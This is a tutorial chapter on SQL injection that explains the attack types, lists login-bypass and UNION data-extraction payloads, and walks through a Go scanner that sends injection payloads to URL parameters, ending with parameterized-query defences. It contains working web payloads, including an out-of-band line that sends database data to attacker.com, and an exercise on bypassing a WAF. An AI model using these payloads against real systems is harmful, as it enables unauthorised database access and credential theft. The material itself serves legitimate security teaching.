# Chapter 23: SQL Injection — The Most Dangerous Web Vulnerability

*SQL injection has been in the OWASP Top 10 for 20+ years. Despite being old, it remains the most impactful web vulnerability. This chapter teaches you how it works and how to build a SQL injection tester in Go.*

---

## What Is SQL Injection?

When a web application builds SQL queries by concatenating user input, an attacker can inject SQL code to manipulate the query.

**The vulnerable pattern:**
```python
# Python/Flask example — NEVER do this
username = request.form['username']
password = request.form['password']

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
db.execute(query)
```

If username is `admin`, the query is:
```sql
SELECT * FROM users WHERE username='admin' AND password='...'
```

If username is `admin'--`, the query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='...'
```

The `--` comments out the rest. The password check disappears. You're logged in as admin with any password.

---

## Types of SQL Injection

### 1. Classic (In-Band) — Error-Based

The database error message leaks information:

```
Input: ' OR 1=1 --
Query: SELECT * FROM users WHERE id='' OR 1=1 --'

Input: ' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

The UNION inject extracts data from other tables.

### 2. Blind Boolean-Based

No error messages — you infer based on True/False behavior:

```sql
-- Does this return data or empty?
' AND SUBSTRING(password,1,1)='a'--
' AND SUBSTRING(password,1,1)='b'--
```

You can extract data one character at a time by checking which condition makes the page behave differently.

### 3. Blind Time-Based

No visible difference — you infer from response time:

```sql
-- MySQL: if password starts with 'a', wait 5 seconds
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--

-- PostgreSQL: 
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

If the response takes 5+ seconds, the condition is true.

### 4. Out-of-Band

Extract data via DNS or HTTP requests (advanced — useful when nothing else works):
```sql
-- MySQL: make a DNS lookup with the data
' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'))--
```

---

## Authentication Bypass — Classic Exploit

### The Login Form Attack

```
Username: admin'--
Password: anything
```

Generated SQL:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Equivalent to:
SELECT * FROM users WHERE username='admin'
```

**More payloads:**
```
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
') OR ('1'='1
' OR 1=1#        (MySQL comment)
```

---

## Data Extraction — UNION Attack

If a page displays query results, UNION allows reading from other tables:

**Step 1: Find number of columns**
```sql
' ORDER BY 1--    (works)
' ORDER BY 2--    (works)
' ORDER BY 3--    (error = only 2 columns)
```

**Step 2: Find which columns display data**
```sql
' UNION SELECT NULL,NULL--
' UNION SELECT 'a','b'--   (see 'a' or 'b' on page)
```

**Step 3: Extract interesting data**
```sql
-- Get database version
' UNION SELECT version(),NULL--

-- Get all tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Get columns of a specific table
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get data from users table
' UNION SELECT username,password FROM users--
```

---

## Building a SQL Injection Tester in Go

```go
// file: cmd/sqli/main.go
package main

import (
    "flag"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strings"
    "time"
)

// SQLiTester tests for SQL injection vulnerabilities
type SQLiTester struct {
    BaseURL    string
    Client     *http.Client
    Verbose    bool
    BaseLen    int    // Length of normal response (for comparison)
    BaseBody   string // Body of normal response
}

// Common SQL injection payloads
var booleanPayloads = []string{
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "' OR 'a'='a",
    "' OR ''='",
    "1 OR 1=1",
    "' OR 2>1--",
    "' OR 'x'='x",
}

var errorPayloads = []string{
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "%27",      // URL-encoded '
    "%22",      // URL-encoded "
    "1'",
    "1\"",
    "1`",
    "' AND '1'='2",
}

// Database-specific error strings that indicate SQLi
var dbErrors = []string{
    // MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    // PostgreSQL
    "pg::syntaxerror",
    "unterminated quoted string",
    // MSSQL
    "microsoft sql server",
    "incorrect syntax near",
    // SQLite
    "sqlite3.operationalerror",
    "near \"syntax\"",
    // Oracle
    "ora-01756",
    "quoted string not properly terminated",
    // Generic
    "sql syntax",
    "syntax error",
    "mysql_fetch",
    "num_rows",
}

func NewSQLiTester(targetURL string, verbose bool) *SQLiTester {
    client := &http.Client{
        Timeout: 10 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // don't follow redirects
        },
    }
    
    t := &SQLiTester{
        BaseURL: targetURL,
        Client:  client,
        Verbose: verbose,
    }
    
    // Get baseline response
    body, statusCode, err := t.makeRequest(targetURL)
    if err == nil {
        t.BaseLen = len(body)
        t.BaseBody = body
        if verbose {
            fmt.Printf("[*] Baseline: %d bytes, HTTP %d\n", t.BaseLen, statusCode)
        }
    }
    
    return t
}

func (t *SQLiTester) makeRequest(reqURL string) (string, int, error) {
    resp, err := t.Client.Get(reqURL)
    if err != nil {
        return "", 0, err
    }
    defer resp.Body.Close()
    
    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        return "", resp.StatusCode, err
    }
    
    return string(bodyBytes), resp.StatusCode, nil
}

// TestParam tests a specific URL parameter for SQLi
func (t *SQLiTester) TestParam(paramName, originalValue string) []string {
    var findings []string
    
    parsedURL, err := url.Parse(t.BaseURL)
    if err != nil {
        return nil
    }
    
    params := parsedURL.Query()
    
    fmt.Printf("\n[+] Testing parameter: %s\n", paramName)
    
    // Test error-based payloads first (fast)
    fmt.Println("[*] Testing error-based payloads...")
    for _, payload := range errorPayloads {
        params.Set(paramName, originalValue+payload)
        parsedURL.RawQuery = params.Encode()
        testURL := parsedURL.String()
        
        body, statusCode, err := t.makeRequest(testURL)
        if err != nil {
            continue
        }
        
        bodyLower := strings.ToLower(body)
        
        // Check for database error messages
        for _, errStr := range dbErrors {
            if strings.Contains(bodyLower, errStr) {
                finding := fmt.Sprintf("ERROR-BASED SQLi: param='%s' payload='%s' (DB error: '%s') [HTTP %d]",
                    paramName, payload, errStr, statusCode)
                findings = append(findings, finding)
                fmt.Printf("[!] FOUND: %s\n", finding)
                break
            }
        }
        
        if t.Verbose {
            fmt.Printf("    Payload: %-25s → HTTP %d, %d bytes\n", payload, statusCode, len(body))
        }
    }
    
    // Test boolean-based payloads
    fmt.Println("[*] Testing boolean-based payloads...")
    for _, payload := range booleanPayloads {
        params.Set(paramName, payload)
        parsedURL.RawQuery = params.Encode()
        testURL := parsedURL.String()
        
        body, statusCode, err := t.makeRequest(testURL)
        if err != nil {
            continue
        }
        
        // Boolean injection often returns significantly different response size
        sizeDiff := len(body) - t.BaseLen
        if sizeDiff < 0 {
            sizeDiff = -sizeDiff
        }
        
        // If response is >20% different from baseline, it might be SQLi
        threshold := t.BaseLen / 5
        if threshold < 100 {
            threshold = 100
        }
        
        if sizeDiff > threshold && statusCode == 200 {
            finding := fmt.Sprintf("BOOLEAN-BASED SQLi (possible): param='%s' payload='%s' (size diff: %d bytes) [HTTP %d]",
                paramName, payload, sizeDiff, statusCode)
            findings = append(findings, finding)
            fmt.Printf("[?] POSSIBLE: %s\n", finding)
        }
        
        if t.Verbose {
            fmt.Printf("    Payload: %-25s → HTTP %d, %d bytes (diff: %+d)\n",
                payload, statusCode, len(body), len(body)-t.BaseLen)
        }
    }
    
    // Test time-based (check for SLEEP-induced delays)
    fmt.Println("[*] Testing time-based payloads (slow)...")
    timePayloads := []struct {
        payload string
        db      string
    }{
        {"' AND SLEEP(2)--", "MySQL"},
        {"'; SELECT SLEEP(2)--", "MySQL"},
        {"' AND pg_sleep(2)--", "PostgreSQL"},
        {"'; WAITFOR DELAY '0:0:2'--", "MSSQL"},
        {"' OR SLEEP(2)#", "MySQL"},
    }
    
    for _, tp := range timePayloads {
        params.Set(paramName, originalValue+tp.payload)
        parsedURL.RawQuery = params.Encode()
        testURL := parsedURL.String()
        
        start := time.Now()
        _, statusCode, err := t.makeRequest(testURL)
        elapsed := time.Since(start)
        
        if err != nil {
            continue
        }
        
        if elapsed >= 2*time.Second {
            finding := fmt.Sprintf("TIME-BASED SQLi (%s): param='%s' payload='%s' (delay: %s) [HTTP %d]",
                tp.db, paramName, tp.payload, elapsed.Round(time.Millisecond), statusCode)
            findings = append(findings, finding)
            fmt.Printf("[!] FOUND: %s\n", finding)
        }
        
        if t.Verbose {
            fmt.Printf("    Payload: %-35s → %s (HTTP %d)\n", tp.payload, elapsed.Round(time.Millisecond), statusCode)
        }
    }
    
    return findings
}

func main() {
    urlFlag := flag.String("url", "", "Target URL with parameter (e.g. http://example.com/page?id=1)")
    paramFlag := flag.String("param", "", "Parameter to test (e.g. id). Empty = test all params")
    verbose := flag.Bool("v", false, "Verbose output")
    
    flag.Parse()
    
    if *urlFlag == "" {
        fmt.Fprintln(os.Stderr, "Usage: sqli -url <url> [-param <name>] [-v]")
        fmt.Fprintln(os.Stderr, "Example: sqli -url 'http://testphp.vulnweb.com/artists.php?artist=1' -param artist")
        os.Exit(1)
    }
    
    fmt.Println("╔════════════════════════════════════════╗")
    fmt.Println("║     GoSQLi — SQL Injection Tester     ║")
    fmt.Println("╚════════════════════════════════════════╝")
    fmt.Printf("Target: %s\n", *urlFlag)
    
    tester := NewSQLiTester(*urlFlag, *verbose)
    
    parsedURL, err := url.Parse(*urlFlag)
    if err != nil {
        fmt.Fprintln(os.Stderr, "Invalid URL:", err)
        os.Exit(1)
    }
    
    params := parsedURL.Query()
    if len(params) == 0 {
        fmt.Fprintln(os.Stderr, "No parameters found in URL")
        os.Exit(1)
    }
    
    var allFindings []string
    
    if *paramFlag != "" {
        // Test specific parameter
        if val, ok := params[*paramFlag]; ok {
            findings := tester.TestParam(*paramFlag, val[0])
            allFindings = append(allFindings, findings...)
        } else {
            fmt.Fprintf(os.Stderr, "Parameter '%s' not found in URL\n", *paramFlag)
        }
    } else {
        // Test all parameters
        for name, values := range params {
            findings := tester.TestParam(name, values[0])
            allFindings = append(allFindings, findings...)
        }
    }
    
    fmt.Println("\n" + strings.Repeat("═", 60))
    fmt.Printf("SCAN COMPLETE — %d finding(s)\n", len(allFindings))
    fmt.Println(strings.Repeat("═", 60))
    
    for i, finding := range allFindings {
        fmt.Printf("%d. %s\n", i+1, finding)
    }
    
    if len(allFindings) == 0 {
        fmt.Println("No SQL injection vulnerabilities detected.")
        fmt.Println("(Note: This is a basic tester — WAFs and complex apps may need manual testing)")
    }
}
```

### Test Targets (Legal)

```bash
# testphp.vulnweb.com — a deliberately vulnerable test site
go run cmd/sqli/main.go -url "http://testphp.vulnweb.com/artists.php?artist=1" -param artist -v

# DVWA (Damn Vulnerable Web Application) — install locally
# WebGoat — Java-based vulnerable app
# SQLi-labs — specifically for practicing SQL injection
```

---

## Prevention — How to Fix SQL Injection

**Parameterized queries (ALWAYS do this):**

```python
# WRONG:
query = "SELECT * FROM users WHERE id=" + user_id

# RIGHT (parameterized):
cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))
```

```go
// Go — using database/sql
var user User
err := db.QueryRow("SELECT * FROM users WHERE id=$1", userID).Scan(&user)
// The $1 is a placeholder — user input NEVER enters the SQL string
```

**Input validation as defense-in-depth:**
```go
func validateID(id string) bool {
    // Only allow digits for a numeric ID
    for _, c := range id {
        if c < '0' || c > '9' {
            return false
        }
    }
    return true
}
```

**Least privilege:** The database user used by the web app should only have SELECT/INSERT/UPDATE on the specific tables it needs — never DROP, never access to `information_schema`.

---

## Summary

| SQLi Type | How it works | Detection method |
|-----------|--------------|-----------------|
| Error-based | DB error reveals info | Check for DB error strings |
| Boolean-based | Different response for T/F | Compare response sizes |
| Time-based | SLEEP(n) causes delay | Measure response time |
| UNION-based | Extract other table data | Different data in response |

---

## Exercises

1. Set up DVWA (Damn Vulnerable Web App) locally and find the SQL injection page
2. Use our scanner to test it — compare results with manual testing
3. Extract the users table from DVWA's SQL injection challenge using UNION
4. Modify the Go scanner to also test POST parameters, not just GET
5. Research how a WAF (Web Application Firewall) would block our payloads, and how to bypass it
